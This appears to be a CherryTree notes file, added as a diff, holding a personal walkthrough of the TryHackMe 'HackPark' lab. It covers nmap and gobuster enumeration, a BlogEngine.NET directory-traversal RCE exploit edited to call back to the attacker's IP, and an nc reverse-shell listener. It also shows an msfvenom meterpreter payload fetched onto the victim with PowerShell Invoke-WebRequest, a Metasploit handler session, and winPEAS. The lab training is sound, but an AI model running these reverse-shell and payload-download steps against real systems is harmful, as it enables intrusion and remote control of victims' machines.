@@ -1,0 +1,813 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Scannning and Enumeration" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="#ff0000" ts_creation="1647026640" ts_lastsave="1647028348">
+    <rich_text># This is a write up on Try Hack Me's HackPark
+# In this room we will be Hacking Windows with Hydra, RCE &amp; WinPEAS
+# Video Assistance: Optional
+=================================================================
+KEY Terms
+#				        GBAR == google search bar
+#    					IBAR == google Image Search
+
+
+
+
+	
+# First things first. Nmap this bad boy.
+# THM victim/target IP = 10.10.222.188
+# My THM IP Address/ Via my vpn connection is 10.13.7.111
+
+ENUMERATION
+
+we are going to start off by checking for open ports and servies.
+
+$ nmap -sC -sV -oN scans/nmap -Pn &lt;Machine IP&gt;
+
+# -sC Performs a script scan using the default set of scripts. It is equivalent to --script=default.
+
+        Looks to use scripts that shouldn't knock the server over abd are typically less intrusive
+
+# -sV Enables version detection, as discussed above. Alternatively, you can use -A, which enables version detection among other things. 
+
+
+# -oN outputing the results to a directory named scans and the information saved as nmap.
+
+# -Pn this turns off the ping function in nmap. 
+		We are turning this function off because Windows machines do not respond to ICMP requests.
+		If we scanned it, it would come back as all hosts down. 
+
+# -p- scan ALL 65,535 ports 
+		Always have an AllScan.txt we just never know what might be on the higher ports
+		This will scan past the first 1024 ports.		
+		I would run this as a second scan by itself
+
+# &lt;Machine IP&gt; the ip address of the machine you wish to scan
+	
+	NOTE: If helps to be in a root shell or use sudo for your nmap commands
+
+
+        BWT:
+# we are scanning the machine because we need to get a lay of the 
+# land. We need to get a list of hosts: A.K.A ip address/ ports: 443, 445, 80, 8080, etc/
+# this also lets us know what services are running and what VERSION of these services are being used.
+''
+──(kali㉿kali)-[~/Write_Ups/THM/HackPark]                   
+└─$ sudo nmap 10.10.222.188 -sC -sV -oN  scans/nmap -Pn
+Starting Nmap 7.92 ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2022-03-09 18:08 UTC
+Nmap scan report for 10.10.222.188                                                                                                               
+Host is up (0.22s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+| http-methods: 
+|_  Potentially risky methods: TRACE 
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2022-03-08T18:01:01
+|_Not valid after:  2022-09-07T18:01:01
+|_ssl-date: 2022-03-09T18:10:18+00:00; -3s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2022-03-09T18:10:15+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -3s, deviation: 0s, median: -4s
+
+Service detection performed. Please report any incorrect results at </rich_text>
+    <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+    <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 107.97 seconds
+
+''
+# If we look through our nmap results we see | http-robots.txt: 6 disallowed entries
+#					     | /Account/*.* /search /search.aspx /error404.aspx
+# 					     |_/archive /archive.aspx
+# so lets head over and take a look at &lt; </rich_text>
+    <rich_text link="webs http://10.10.222.188:80/robots.txt">http://10.10.222.188:80/robots.txt</rich_text>
+    <rich_text> &gt;
+
+''
+User-agent: *
+Disallow: /Account/*.*
+Disallow: /search
+Disallow: /search.aspx
+Disallow: /error404.aspx
+Disallow: /archive
+Disallow: /archive.aspx
+
+#Remove the '#' character below and replace example.com with your THM machine target IP.
+# sitemap: </rich_text>
+    <rich_text link="webs http://example.com/sitemap.axd">http://example.com/sitemap.axd</rich_text>
+    <rich_text> 
+# WebMatrix 1.0
+	
+	We can visit each by heading to the URL </rich_text>
+    <rich_text link="webs http://10.10.222.188:80/">http://10.10.222.188:80/</rich_text>
+    <rich_text>{ext. here}
+	Nothing too fruitful here. but if we take a look at our gobuster scan
+	we see the ext /admin. lets check it out.
+
+# </rich_text>
+    <rich_text link="webs http://10.10.222.188:80/admin">http://10.10.222.188:80/admin</rich_text>
+    <rich_text>	    *press return
+
+	This page renders out to &lt; </rich_text>
+    <rich_text link="webs http://10.10.222.188/Account/login.aspx?ReturnURL=/admin">http://10.10.222.188/Account/login.aspx?ReturnURL=/admin</rich_text>
+    <rich_text> &gt;
+# Now we are at a blogengine log in page!
+
+Good Practice to do an allports scan!
+
+
+	Ok so we are now going to run an Allports scan with nmap
+	$ sudo nmap -Pn -p- 10.10.222.188 -oN scans/Allports
+''
+	──(kali㉿kali)-[~/Write_Ups/THM/HackPark]                   
+	└─$ sudo nmap -Pn -p- 10.10.222.188 -oN scans/Allports      
+	Starting Nmap 7.92 ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2022-03-09 18:19 UTC
+	Nmap scan report for 10.10.222.188
+	Host is up (0.18s latency).
+	Not shown: 65533 filtered tcp ports (no-response)
+	PORT     STATE SERVICE
+	80/tcp   open  http
+	3389/tcp open  ms-wbt-server
+
+	Nmap done: 1 IP address (1 host up) scanned in 301.98 seconds</rich_text>
+    <node name="Gobuster" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="7" is_bold="0" foreground="#ff0000" ts_creation="1647026947" ts_lastsave="1647027230">
+      <rich_text>========================================================
+Enumerating with Gobuster
+
+# $ gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.0.0.19/">http://10.0.0.19/</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+	'dir' puts gobuster into directory bruteforce mode
+
+	'-u'  specify's the URL you wish to attack
+
+	'-w'  allows us to point at a wordlist/dictionary we want to use
+
+# NOTE: If your ever doing a live CTF or anything along the same vein
+#	I would reccomend /usr/share/wordlists/SecLists/Discovery/Web-Content/
+#	cd all the way to Web-Content now $ ls | grep big*
+#	you will see anything that has big in the title. you want 'big.txt'
+''
+└─# gobuster dir -u </rich_text>
+      <rich_text link="webs http://10.10.222.188">http://10.10.222.188</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster.txt                      1 ⨯
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     </rich_text>
+      <rich_text link="webs http://10.10.222.188">http://10.10.222.188</rich_text>
+      <rich_text>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/09 18:10:14 Starting gobuster in directory enumeration mode
+===============================================================
+/blog                 (Status: 500) [Size: 1208]
+/search               (Status: 200) [Size: 8407]
+/archives             (Status: 200) [Size: 8326]
+/default              (Status: 500) [Size: 1763]
+/archive              (Status: 200) [Size: 8325]
+/content              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/content/]">http://10.10.222.188/content/]</rich_text>
+      <rich_text>
+/contactus            (Status: 200) [Size: 9937]                                   
+/contact              (Status: 200) [Size: 9935]                                   
+/Default              (Status: 500) [Size: 1763]                                   
+/contacts             (Status: 200) [Size: 9936]                                   
+/contact_us           (Status: 200) [Size: 9938]                                   
+/scripts              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/scripts/]">http://10.10.222.188/scripts/]</rich_text>
+      <rich_text>
+/account              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/account/]">http://10.10.222.188/account/]</rich_text>
+      <rich_text>
+/admin                (Status: 302) [Size: 173] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Account/login.aspx?ReturnURL=/admin]">http://10.10.222.188/Account/login.aspx?ReturnURL=/admin]</rich_text>
+      <rich_text>  ********
+/Search               (Status: 200) [Size: 8407]                                                              
+/Contact              (Status: 200) [Size: 9935]                                                              
+/contact-us           (Status: 200) [Size: 9938]     
+/ContactUs            (Status: 200) [Size: 9937]                                                              
+/custom               (Status: 301) [Size: 151] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/custom/]">http://10.10.222.188/custom/]</rich_text>
+      <rich_text>                            
+/Content              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Content/]">http://10.10.222.188/Content/]</rich_text>
+      <rich_text>                           
+/contactUs            (Status: 200) [Size: 9937]                                                              
+/Blog                 (Status: 500) [Size: 1208]                                                              
+/Archive              (Status: 200) [Size: 8325]                                                              
+/contactinfo          (Status: 200) [Size: 9939]                                                              
+/setup                (Status: 302) [Size: 175] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Account/login.aspx?ReturnUrl=%2fsetup]">http://10.10.222.188/Account/login.aspx?ReturnUrl=%2fsetup]</rich_text>
+      <rich_text>
+/fonts                (Status: 301) [Size: 150] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/fonts/]">http://10.10.222.188/fonts/]</rich_text>
+      <rich_text>                               
+/contact_off          (Status: 200) [Size: 9939]                                                                
+/Contact_Us           (Status: 200) [Size: 9938]                                                                
+/Contacts             (Status: 200) [Size: 9936]                                                                
+/SearchResults        (Status: 200) [Size: 8414]                                                                
+/%20                  (Status: 500) [Size: 1763]                                                                
+/searchresults        (Status: 200) [Size: 8414]                                                                
+/Archives             (Status: 200) [Size: 8326]                                                                
+/Scripts              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Scripts/]">http://10.10.222.188/Scripts/]</rich_text>
+      <rich_text>                             
+/search_form          (Status: 200) [Size: 8412]                                                                
+/searchresultsbrief   (Status: 200) [Size: 8419]                                                                
+/search2              (Status: 200) [Size: 8408]                                                                
+/searchtips           (Status: 200) [Size: 8411]                                                                
+/Account              (Status: 301) [Size: 152] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Account/]">http://10.10.222.188/Account/]</rich_text>
+      <rich_text>                             
+/contact_form         (Status: 200) [Size: 9940]                                                                
+/Fonts                (Status: 301) [Size: 150] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Fonts/]">http://10.10.222.188/Fonts/]</rich_text>
+      <rich_text>                               
+/contact_information  (Status: 200) [Size: 9947]                                                                [[A^[[A^[[A
+/archive_query        (Status: 200) [Size: 8331]                                                                
+/Admin                (Status: 302) [Size: 173] [--&gt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/Account/login.aspx?ReturnURL=/Admin]">http://10.10.222.188/Account/login.aspx?ReturnURL=/Admin]</rich_text>
+      <rich_text> *******************
+
+
+We see /Admin which looks like it redirects to a login page!
+</rich_text>
+    </node>
+    <node name="WebPage Login" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="7" is_bold="0" foreground="" ts_creation="1647027230" ts_lastsave="1647028046">
+      <rich_text>KEY: GBAR == google search bar
+-    IBAR == google Image Search 
+
+
+# Now that we have a version number lets take a trip to the GBAR.
+# should looke something like this
+	 GBAR: blogenginenet 3.3.6.0 exploit     *press return
+
+# google should return 
+			========
+
+		Screen Grab Here
+
+			========
+
+
+# If you click the first link after the search you should get this address. &lt; </rich_text>
+      <rich_text link="webs https://www.exploit-db.com/exploits/46353">https://www.exploit-db.com/exploits/46353</rich_text>
+      <rich_text> &gt;
+	This is known as a CVE or Common Vulnerability and Exploits.
+
+
+		====================================
+
+		Screen Grab Here
+
+		===================================
+
+# we now have CVE-2019-6714
+	
+	You can download the exploit a couple of ways.
+
+# press the download button and it will download to your downloads folder
+
+# click the {}'s and that will take you to the RAW code. Now hope back into your terminal and cd to where ever you download your exploits.
+# Then use the wget command like so $ wget </rich_text>
+      <rich_text link="webs https://www.exploit-db.com/raw/46353">https://www.exploit-db.com/raw/46353</rich_text>
+      <rich_text>
+# once we get it down you want to rename it to whatever the exploit tells us to. which can be found described in the top part of the exploit
+
+	In this case the exploit says " Note that this file must be uploaded as PostView.ascx."
+	So we will rename the exploit PostView.ascx
+	NOTE: 98.7% of the exploits you find in the wild/online will need one adjustment or another. 
+
+#  $ mv 46353.py PostView.ascx
+
+	If you wanted to you could also use searchsploit from within your terminal like so
+
+# $ ┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+#   └─# searchsploit blogengine.net
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                 |  Path
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                        | asp/webapps/32874.txt
+BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                              | asp/webapps/35168.txt
+BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                             | aspx/webapps/46353.cs
+BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                             | aspx/webapps/47010.py
+BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                        | aspx/webapps/47035.py
+BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                        | aspx/webapps/47011.py
+BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                     | aspx/webapps/47014.py
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+	So we can see that there are a few exploits but the one we want uses Directory Traversal
+	BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                             | aspx/webapps/46353.cs
+ 
+# Once we have the exploit on our machine we need to make some modifications.
+# So first thing we would want to do is open it in leafpad or Sublime/ your text editor of choice.
+# we can remove the instructions at the top of the code so its cleaner and easier to upload
+
+	Next thing we want to do is get our IP address or our THM IP that shows when we connect to our VPN
+	so to get this we run
+
+# ┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+# └─# ifconfig tun0
+  tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
+        inet 10.13.7.111  netmask 255.255.128.0  destination 10.13.7.111
+        inet6 fe80::231a:d36b:7152:6a14  prefixlen 64  scopeid 0x20&lt;link&gt;
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 145611  bytes 112293472 (107.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 283952  bytes 21331434 (20.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+# We can see my THM IP is inet 10.13.7.111.
+# So now we want to  $ vim PostView.ascx
+	
+	We are going to replace this portions of the exploit &lt; using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.20", 4445)) { ' &gt;
+	
+	with our details. Should look like this. &lt; using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.13.7.111", 443)) {  &gt; 
+
+# We change the TcpClient Address and port number to our machines' (the attacking machines') IP/ tun0 and whatever port number we have set up a listener on
+# We are going to use port 443 here because this port is very rarely restricted on firewalls
+# sometimes this port will be configured to be a lot more strict and other times it wont be. Just have to poke it and find out
+=======================================================================
+UPLOAD ME
+
+NOTE: </rich_text>
+      <rich_text weight="heavy">rlwrap</rich_text>
+      <rich_text> gives us the arrow keys to work with when we get our shell up,down,
+
+	Now we are going to follow the exploit instructions...
+
+# we have already modified the exploit. now we want to upload it.
+# in order to upload we want to modify content on the page( upload our exploit)
+	Go to
+	- content tab
+	- click the link that says 'Welcome to HackPark'
+	- This opens up the article for us to edit and we want to click on the folder icon in the center of the page.
+	- File Manager should now be open. Click upload
+	- Navigate to the 'PostView.ascx' file
+
+	Once you have uploaded the exploit we need to set up a listener to catch the reverse shell that comes once we execute the exploit
+
+# ┌──(root💀kali)-[/home/kali/Write_Ups/THM/NoNameCTF]
+# └─# rlwrap nc -lnvp 443 
+# listening on [any] 443 ...
+
+
+	 Once you have set up your listener we want to trigger the exploit by following the directions in the top of exploit code.
+
+" This vulnerability is triggered by accessing the base URL for the 
+ * blog with a theme override specified like so:
+ *
+ * </rich_text>
+      <rich_text link="webs http://10.10.10.10/?theme=../../App_Data/files">http://10.10.10.10/?theme=../../App_Data/files</rich_text>
+      <rich_text>"
+
+	copy and paste &lt; </rich_text>
+      <rich_text link="webs http://10.10.222.188/?theme=../../App_Data/files">http://10.10.222.188/?theme=../../App_Data/files</rich_text>
+      <rich_text> &gt;   into the url and you should get a call back
+
+# our callback revshell info go's here... 
+
+''
+
+┌──(root💀kali)-[/home/kali]                                          
+└─# rlwrap nc -lnvp 443                                               
+listening on [any] 443 ...                                            
+connect to [10.13.7.111] from (UNKNOWN) [10.10.43.190] 49249
+Microsoft Windows [Version 6.3.9600]                        
+(c) 2013 Microsoft Corporation. All rights reserved.                  dir                                                                   
+c:\windows\system32\inetsrv&gt;dir                                       
+ Volume in drive C has no label.                                      
+ Volume Serial Number is 0E97-C552                                    
+ Directory of c:\windows\system32\inetsrv          
+08/03/2019  10:41 AM    &lt;DIR&gt;          .           
+08/03/2019  10:41 AM    &lt;DIR&gt;          ..         
+08/03/2019  09:45 AM           111,616 appcmd.exe 
+07/01/2013  08:49 AM             3,810 appcmd.xml  
+08/03/2019  09:45 AM           174,592 AppHostNavigators.dll
+
+''
+================ Now that we have our shell time to 
+
+
+===========================================================================================================
+NEXT STAGE
+now that we have a shell on the machine. We are "on the system" it is time for Privilege Escalation
+# METASPLOIT to escalate privileges
+# We can Escalate privileges with or without Metasploit.
+# We are using metasploit to gain a more stable and secure shell
+# we create  our explouit pull it over to the target machine/system and then invoke it using powershell to gain our Hardened shell
+# Both of the Exploits run the same but one uses a non staged payload and the other doesn't
+
+==========================
+MSFVENOM
+
+# $ ┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+    └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.7.111 LPORT=9001 -f exe &gt; shell.exe
+# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+# [-] No arch selected, selecting arch: x86 from the payload
+# No encoder specified, outputting raw payload
+# Payload size: 354 bytes
+# Final size of exe file: 73802 bytes
+
+	msfvenom 	# calls the tool
+
+	-p windows/meterpreter/reverse_tcp	# specifys payload we want to use
+	
+	LHOST=10.13.7.111		# Specifys OUR attack machine/ THM IP / $ ifconfig tun0
+
+	LPORT=9001		# Specifys the port we want to listen for the call back on. 
+
+	-f exe		# Specifys what type of file we want. This is windows so a .exe file is what we want
+
+	'&gt; shell.exe'		# the ' &gt; ' AKA greater then sign is a redirection operator in linux. We are using it here to redirect the output
+				that comes from creating our payload and placing it in a file named 'shell.txt' you can name it whatever you like.
+
+# so now that we have created our payload we need to pull it over to the victim/target/remote machine.
+# We are going to do this using powershell.
+# so back at our shell on the machine we would type
+# first we need to navigate to a file that will allow us to write to it. A great place for this is the 'Temp' folder.
+# If we were to try this powershell command in a file other then the Temp directory. We may or may not be able to get the file we want pulled down. Due to incorrect permissions.
+# long story long go to the Temp directory. it is a great place to dump stuff you need.
+
+
+	c:\windows\system32\inetsrv&gt; cd ..
+	c:\windows\system32&gt; cd ..
+	c:\windows&gt; cd ..
+	c:\&gt; cd Windows
+	c:\Windows&gt; cd Temp
+	c:\Windows\Temp&gt; 
+
+# you can use 'dir' to list the directory contents
+# you can use 'pwd' to check what directory you are currently in.
+
+- so now we need to spin up a server in the directory that you have the payload you created with msfvenom I named mine 'reverse.exe'
+- the command will look like so in your terminal
+
+#  ┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+#  └─# ls                        
+#  gobuster.txt  README.md  shell.exe  scans
+                                                                                                                                                 
+#  ┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+#  └─# python -m SimpleHTTPServer
+#  Serving HTTP on 0.0.0.0 port 8000 ...
+
+	We are now hosting a simple http webserver on port 8000. you can specify a different port like this
+	$ python -m SimpleHTTPServer 7000     # this will spin up a server on port 7000
+
+=============
+NEXT STAGE
+
+# Now we need to switch back over to our reverse shell/victim machine
+# we are going to use powershell to pull the file from our python HTTP server we are hosting on port 8000
+# to do this type the following
+ 
+	powershell -c "Invoke-WebRequest -Uri '</rich_text>
+      <rich_text link="webs http://10.13.7.111:8000/reverse.exe'">http://10.13.7.111:8000/shell.exe'</rich_text>
+      <rich_text> -Outfile 'C:\Windows\Temp\shell.exe'"
+
+
+# 	powershell -c 
+
+#	"InvokeWebRequest -Uri
+	# this is powershells version of wget
+	# -Uri lets us specify a URL
+
+#	'</rich_text>
+      <rich_text link="webs http://10.13.7.111:8000/reverse.exe'">http://10.13.7.111:8000/shell.exe'</rich_text>
+      <rich_text>
+	# this is our THM IP/tun0/attacking IP address/local host
+	#:8000 this is specifying the port where we are hosting the python HTTP server
+	# the colon allows us to specify port
+	# shell.exe   this is the name of the payload I created with msfvenom
+
+#	-Outfile 'C:\Windows\Temp\shell.exe'"      # take notice of the quotes. one single quote caping off the Outfile and one set of Double quotes caping off the entire powershell command
+	# This is specifying the path the file is going to be placed in as well as named as.
+	# C:\Windows\Temp\ is the out path on the machine. 
+	# shell.exe is the name of the file we are pulling
+
+# Once we hit enter we should see a hit on the server.
+# I.e. your terminal window that is serving the exploit should see a successful 200 GET request</rich_text>
+    </node>
+  </node>
+  <node name="Metasploit" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ff0000" ts_creation="1647028348" ts_lastsave="1647028667">
+    <rich_text>NEW STAGE
+Now that we have the exploit on the target machine. Before we execute it we will need to set up a way to interact with the exploit once
+it is run. 
+
+Since we configured the payload using msfvenom it will be a meterpreter shell that comes back so we will need to configure a handler
+with msfconsole
+
+# $ msfconsole
+
+┌──(root💀kali)-[/home/kali/Write_Ups/THM/HackPark]
+└─# msfconsole
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v6.1.31-dev                          ]
++ -- --=[ 2201 exploits - 1166 auxiliary - 395 post       ]
++ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can pivot connections over sessions 
+started with the ssh_login modules
+
+msf6 &gt; use exploit/multi/handler          *press enter
+
+#	your prompt will change to  
+
+msf6 &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; show options
+
+#	you can see what options are required with 'show options'
+
+msf6 exploit(multi/handler) &gt; show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+# Now we can see what we need to set in order to set up the handler/listener
+	
+msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp                                                                  
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp	
+
+# 	since the payload we configured in our msfvenom was a windows meterpreter reverse tcp payload.
+# 	When we set the payload here. this tells meterpreter that your expecting a call from this payload.
+# 	Be prepared to send it what it needs to initialize.
+
+# Next thing we want to do it set the LHOST to tun0 like so 
+# if you need to check use the command $ ifconfig tun0 in 
+
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; 10.13.7.111
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; 10.13.7.111
+
+	I run it twice here because sometimes metasploit can ignore the first command.
+	Nope I dont know why.
+
+msf6 exploit(multi/handler) &gt; set LPORT 9001
+LPORT =&gt; 9001
+
+	We are now good to go. we type in run and press enter. 
+
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.13.7.111:9001
+
+# 	**** Important! Once you hit return and you see&lt; [*] Started reverse TCP handler on 10.13.7.111:9001 &gt; DO NOT TOUCH ANYTHING!
+# 	Maybe it's more obvious to you reading this but I was stuck at this spot for an embarassing length of time. All because I kept
+# 	hitting return after The handler had started. When you do this it borks everything up. The shells start coming through and closing 
+# 	right as they connect which makes it impossible to get the shell to stay open at that point. So you will have to restart the machine
+#	get a fresh IP and start at it again.</rich_text>
+    <node name="Meterpreter" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="7" is_bold="0" foreground="" ts_creation="1647028510" ts_lastsave="1647028587">
+      <rich_text>
+NEW STAGE 
+We now have a meterpreter shell and now that we have everything is set up we need to switch back to our target machine/victim machine
+
+	c:\Windows\Temp&gt; dir
+# the 'dir' command is windows version on 'ls'
+# So we use the 'dir' command to confirm that we successfully pulled the exploit reverse.exe
+# down to the victim/target machine
+# now all we need to do is execute the command to do this type
+
+	c:\Windows\Temp&gt; .\shell.exe      *press enter
+
+
+# now back over at the same terminal window that you had your handler set up in.
+# it should look like this now.
+
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.13.7.111:9001
+[*] Sending stage (180291 bytes) to 10.10.222.188
+[*] Meterpreter session 1 opened (10.13.7.111:9001 --&gt;10.10.222.188:51062) at 2022-03-09 20:39:47 +0100
+
+meterpreter &gt; ls
+''
+.
+.
+040777/rwxrw  0       dir   2022-03-11 17:50:25  Microsoft
+xrwx                         +0000
+100666/rw-rw  1206    fil   2019-08-06 21:13:59  cleanup.txt
+-rw-                         +0000
+100666/rw-rw  421     fil   2019-08-06 21:13:59  cmdout
+-rw-                         +0000
+100777/rwxrw  73802   fil   2022-03-11 17:53:47  shell.exe
+.
+.
+''
+
+# we can now use linux commands on the windows machine!
+
+meterpreter &gt;
+
+
+=======================================================================================================</rich_text>
+    </node>
+  </node>
+  <node name="Winpeas.bat" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1647028667" ts_lastsave="1647028782">
+    <rich_text>NEW STAGE
+Try Hack Me would have us use the Windows exploit suggester. </rich_text>
+    <rich_text link="webs https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</rich_text>
+    <rich_text>
+But we are going to use Winpeas here.
+It has a brother Linpeas which is for linux and I love it. It works great!
+
+# so to do this I will open a terminal window and  switch directories to my /opt/ folder and the command will look like this
+
+	┌──(root💀kali)-[/opt]
+        └─# wget </rich_text>
+    <rich_text link="webs https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat">https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat</rich_text>
+    <rich_text>                                              
+        --2022-03-10 02:19:26--  </rich_text>
+    <rich_text link="webs https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat">https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat</rich_text>
+    <rich_text>
+        Resolving github.com (github.com)... 140.82.113.3
+        Connecting to github.com (github.com)|140.82.113.3|:443... connected.
+        HTTP request sent, awaiting response... 200 OK
+	Length: unspecified [text/html]
+	Saving to: ‘winPEAS.bat’
+
+	winPEAS.bat           [  &lt;=&gt;       ] 418.17K   996KB/s    in 0.4s    
+
+	2022-03-10 02:19:27 (996 KB/s) - ‘winPEAS.bat’ saved [428203]
+
+                                                                      
+	┌──(root💀kali)-[/opt]
+	└─# ls
+	containerd  impacket   nessus   PayloadsAllTheThings  tplmap
+	FakePip     microsoft  nishang  ReconDog              winPEAS.bat
+
+
